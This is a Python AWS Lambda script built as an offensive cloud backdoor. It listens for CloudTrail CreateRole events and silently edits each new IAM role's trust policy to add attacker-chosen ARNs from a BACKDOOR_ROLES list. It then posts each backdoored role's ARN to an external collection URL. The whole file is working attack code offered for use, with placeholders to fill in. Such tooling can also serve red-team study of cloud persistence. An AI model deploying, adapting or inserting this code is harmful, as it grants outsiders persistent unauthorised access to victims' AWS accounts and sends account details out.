#!/usr/bin/env python
from __future__ import print_function
import json
import boto3
from botocore.exceptions import ClientError
import requests
import random

# An endpoint to send access keys to, e.g. http://requestb.in/
POST_URL = 'https://...'

BACKDOOR_ROLES = [
    'your-arn-here'
]


def lambda_handler(event, context):
    if event['detail']['eventName'] == 'CreateRole':
        role_name = event['detail']['requestParameters']['roleName']
        iam = boto3.resource('iam')
        role = iam.Role(role_name)
        original_policy = role.assume_role_policy_document
        hacked_policy = modify_assume_role_policy(original_policy)
        client = boto3.client('iam')
        response = client.update_assume_role_policy(RoleName=role_name, PolicyDocument=json.dumps(hacked_policy))
        requests.post(POST_URL, data={
            "RoleArn": event['detail']['responseElements']['role']['arn']
        })
    return None


def modify_assume_role_policy(original_policy):
    if 'Statement' in original_policy:
        statements = original_policy['Statement']
        for statement in statements:
            if 'Effect' in statement and statement['Effect'] == 'Allow':
                if 'Principal' in statement and isinstance(statement['Principal'], dict):
                    # Principals can be services, federated users, etc.
                    # 'AWS' signals a specific account based resource
                    # print(statement['Principal'])
                    if 'AWS' in statement['Principal']:
                        if isinstance(statement['Principal']['AWS'], list):
                            # If there are multiple principals, append to the list
                            statement['Principal']['AWS'].append(random.choice(BACKDOOR_ROLES))
                        else:
                            # If a single principal exists, make it into a list
                            statement['Principal']['AWS'] = [
                                statement['Principal']['AWS'],
                                random.choice(BACKDOOR_ROLES)
                            ]
                    else:
                        # No account based principal principal exists
                        statement['Principal']['AWS'] = random.choice(BACKDOOR_ROLES)
                elif 'Principal' not in statement:
                    # This shouldn't be possible, but alas, it is
                    statement['Principal'] = {'AWS': random.choice(BACKDOOR_ROLES)}

    return original_policy # now modified in line